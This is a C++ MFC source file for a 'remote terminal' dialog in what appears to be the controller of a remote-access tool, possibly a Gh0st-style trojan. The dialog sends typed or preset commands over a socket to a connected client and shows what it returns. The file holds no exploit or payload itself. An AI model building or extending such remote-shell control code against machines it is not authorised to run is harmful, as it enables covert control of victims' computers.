// ShellDlg.cpp : implementation file
//

#include "stdafx.h"
#include <locale.h>
#include "Quick.h"
#include "ShellDlg.h"
#include "BuildDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

CShellDlg::CShellDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(CShellDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CShellDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_nCurSel = 0;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_CMD));
	m_bOnClose = FALSE;
	setlocale(LC_CTYPE, ("chs"));

}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CShellDlg)
	DDX_Control(pDX, IDC_EDIT, m_edit);
	// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
	DDX_Control(pDX, IDC_CMDLINE, List_cmd);
	DDX_Control(pDX, IDC_EDIT2, SendEdit);
	DDX_Control(pDX, IDC_BUTTON1, SendButton);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	//{{AFX_MSG_MAP(CShellDlg)
	ON_WM_SIZE()
	ON_EN_CHANGE(IDC_EDIT, OnChangeEdit)
	ON_NOTIFY(NM_DBLCLK, IDC_CMDLINE,OnDblclkMainlist)
	ON_WM_CTLCOLOR()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BUTTON1, &CShellDlg::OnBnClickedButton1)

END_MESSAGE_MAP()



BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	USES_CONVERSION;

	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_edit.m_hWnd)
		{
			CString str;
			m_edit.GetWindowText(str);
			str += _T("\r\n");
	
			CString stra_last= str.Right(str.GetLength() - m_nCurSel);
			CStringA stra;
			stra = stra_last;
			stra_last = str.Left(m_nCurSel);
			m_edit.SetWindowText(stra_last);
			m_iocpServer->Send(m_pContext, (LPBYTE)(stra.GetBuffer()), stra.GetLength());
			m_nCurSel = m_edit.GetWindowTextLength();
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_edit.m_hWnd)
		{
			if (m_edit.GetWindowTextLength() <= (int)m_nReceiveLength)
				return true;
		}
	
	}

	// Ctrl没按下
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	len = m_edit.GetWindowTextLength();
		m_edit.SetSel(len, len);
		// 用户删除了部分内容，改变m_nCurSel
		if (len < (int)m_nCurSel)
			m_nCurSel = len;
	}
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)//捕捉回车
	{
		return TRUE;//直接返回true
	}
	else
	{
		return CDialog::PreTranslateMessage(pMsg);
	}
}

BOOL CShellDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	m_nCurSel = m_edit.GetWindowTextLength();

	List_cmd.SetExtendedStyle(LVS_EX_FULLROWSELECT | LVS_EX_UNDERLINEHOT | LVS_EX_SUBITEMIMAGES | LVS_EX_GRIDLINES);
	List_cmd.InsertColumn(0, _T("标题"), LVCFMT_LEFT, 120, -1);
	List_cmd.InsertColumn(1, _T("命令"), LVCFMT_LEFT, 500, -1);
	List_cmd.InsertColumn(2, _T("说明"), LVCFMT_LEFT, 700, -1);



	TCHAR DatPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, DatPath, sizeof(DatPath));
	*_tcsrchr(DatPath, _T('\\')) = '\0';
	CString cstrFileFullPath;
	cstrFileFullPath = DatPath;
	cstrFileFullPath += _T("\\Plugins\\x86\\cmd.txt");

	// 判断文件是否存在
	bool bFileExist = PathFileExists(cstrFileFullPath)
		&& (!PathIsDirectory(cstrFileFullPath));
	if (false == bFileExist)
		writerresour(IDR_TEXT_CMD, _T("TEXT"), cstrFileFullPath);
		// 打开文件
		CStdioFile file;
		BOOL ret = file.Open(cstrFileFullPath,
			CFile::modeRead | CFile::shareDenyNone);
		if (ret)
		{
			file.SeekToBegin();
			// 循环读取文件
			CString cstrLine; int i = 0;
			while (1)
			{
				if(file.ReadString(cstrLine))
					List_cmd.InsertItem(i, cstrLine, -1);
				else
					break;
				if (file.ReadString(cstrLine))
					List_cmd.SetItemText(i, 1, cstrLine);
				else
					break;
				if (file.ReadString(cstrLine))
					List_cmd.SetItemText(i, 2, cstrLine);
				else
					break;
				if (!file.ReadString(cstrLine)) 	break;		
				i++;
			}
			// 关闭文件
			file.Close();
		}
	

	m_nCurSel = m_edit.GetWindowTextLength();

	CString str;
	str.Format(_T("远程终端 \\\\ %s "), m_pContext->szAddress),
		SetWindowText(str);

	m_edit.SetLimitText(MAXDWORD); // 设置最大长度
	ResizeEdit();
	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}


void CShellDlg::writerresour(int lpszType, LPCTSTR RName, LPCTSTR lpszName) //写出资源文件
{
	// 查找所需的资源
	HRSRC   hResInfo = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(lpszType), RName);
	if (hResInfo == NULL) return;
	// 获得资源尺寸
	DWORD dwSize = SizeofResource(NULL, hResInfo);
	// 装载资源
	HGLOBAL hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL) return;

	LPBYTE p_date = new BYTE[dwSize];
	if (p_date == NULL)     return;
	// 复制资源数据
	CopyMemory((LPVOID)p_date, (LPCVOID)LockResource(hResData), dwSize);

	HANDLE hFile = CreateFile(lpszName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL) {
		DWORD  dwWritten;
		WriteFile(hFile, (LPVOID)p_date, dwSize, &dwWritten, NULL);
		CloseHandle(hFile);
	}
	SAFE_DELETE_AR(p_date);

}

void CShellDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("远程终端 \\\\ %s   [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_pContext->szAddress, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}

void CShellDlg::OnReceiveComplete()
{
	AddKeyBoardData();
	m_nReceiveLength = m_edit.GetWindowTextLength();
}

void CShellDlg::AddKeyBoardData()
{

	m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CStringA strResulta =(char*) m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	CString strResult;
	strResult = strResulta;


	strResult.Replace(L"\n", L"\r\n");
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);
	m_edit.ReplaceSel(strResult);
	m_nCurSel = m_edit.GetWindowTextLength();


	// 最后填上0
	//m_pContext->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	//CString strResult = m_pContext->m_DeCompressionBuffer.GetBuffer(0);

	/*int nBufLen = m_pContext->m_DeCompressionBuffer.GetBufferLen();
	char* lpszBuffer = new char[nBufLen+1];
	RtlZeroMemory(lpszBuffer, nBufLen+1);


	
	memcpy(lpszBuffer, m_pContext->m_DeCompressionBuffer.GetBuffer(0), nBufLen);
	CStringA strResult = lpszBuffer;
	strResult.Replace("\n", "\r\n");
	int	len = m_edit.GetWindowTextLength();
	m_edit.SetSel(len, len);

	int size = MultiByteToWideChar(CP_ACP, 0, strResult, -1, NULL, 0);
	TCHAR* retStr = new TCHAR[size * sizeof(TCHAR)];
	MultiByteToWideChar(CP_ACP, 0, strResult, -1, retStr, size);
	
	m_edit.ReplaceSel(retStr);
	m_nCurSel = m_edit.GetWindowTextLength();

	SAFE_DELETE_AR(lpszBuffer);
	SAFE_DELETE_AR(retStr);*/

}



void CShellDlg::OnCancel()
{
	// TODO: Add your message handler code here and/or call default
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}

void CShellDlg::ResizeEdit()
{
	RECT	rectClient;
	RECT	rectEdit;
	GetClientRect(&rectClient);
	rectEdit.left =5;
	rectEdit.top = 5;
	rectEdit.right = rectClient.right-5;
	rectEdit.bottom = rectClient.bottom-197-75;
	if (m_edit.GetSafeHwnd() != NULL)
		m_edit.MoveWindow(&rectEdit); //CMD编辑框

	rectEdit.left = 5;
	rectEdit.top = rectClient.bottom -194;
	rectEdit.right = rectClient.right - 5;
	rectEdit.bottom = rectClient.bottom-5 ;
	if (List_cmd.GetSafeHwnd() != NULL)
		List_cmd.MoveWindow(&rectEdit); //列表

	rectEdit.left = 5;
	rectEdit.top = rectClient.bottom - 194-70;
	rectEdit.right = rectClient.right - 5-70;
	rectEdit.bottom = rectClient.bottom - 200;
	if (SendEdit.GetSafeHwnd() != NULL)
		SendEdit.MoveWindow(&rectEdit); //编辑框

	rectEdit.left = rectClient.right - 70;
	rectEdit.top = rectClient.bottom - 194 - 70;
	rectEdit.right = rectClient.right - 5;
	rectEdit.bottom = rectClient.bottom - 200;
	if (SendButton.GetSafeHwnd() != NULL)
		SendButton.MoveWindow(&rectEdit); //编辑框

}

void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	// TODO: Add your message handler code here
	ResizeEdit();
}

void CShellDlg::OnChangeEdit()
{
	int len = m_edit.GetWindowTextLength();
	if (len < (int)m_nCurSel)
		m_nCurSel = len;
}

HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}



void CShellDlg::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}


//主列表左键双击
void CShellDlg::OnDblclkMainlist(NMHDR* pNMHDR, LRESULT* pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	if (List_cmd.GetSelectedCount() < 1) return;
	POSITION pos = List_cmd.GetFirstSelectedItemPosition();

		int	nItem = List_cmd.GetNextSelectedItem(pos);
		
		CString m_cmdline = List_cmd.GetItemText(nItem, 1);

		SendEdit.SetWindowText(m_cmdline);

	*pResult = 0;
}

void CShellDlg::OnBnClickedButton1()
{
	CString m_cmdline;
	SendEdit.GetWindowText(m_cmdline);
	//int	len = m_edit.GetWindowTextLength();
	//m_edit.SetSel(len, len);
	//m_edit.ReplaceSel(m_cmdline);
	
	
	CStringA stra;
	stra = m_cmdline;
	stra += "\r\n";
	m_iocpServer->Send(m_pContext, (LPBYTE)(stra.GetBuffer(0) ), stra.GetLength()  );
	m_nCurSel = m_edit.GetWindowTextLength();
}

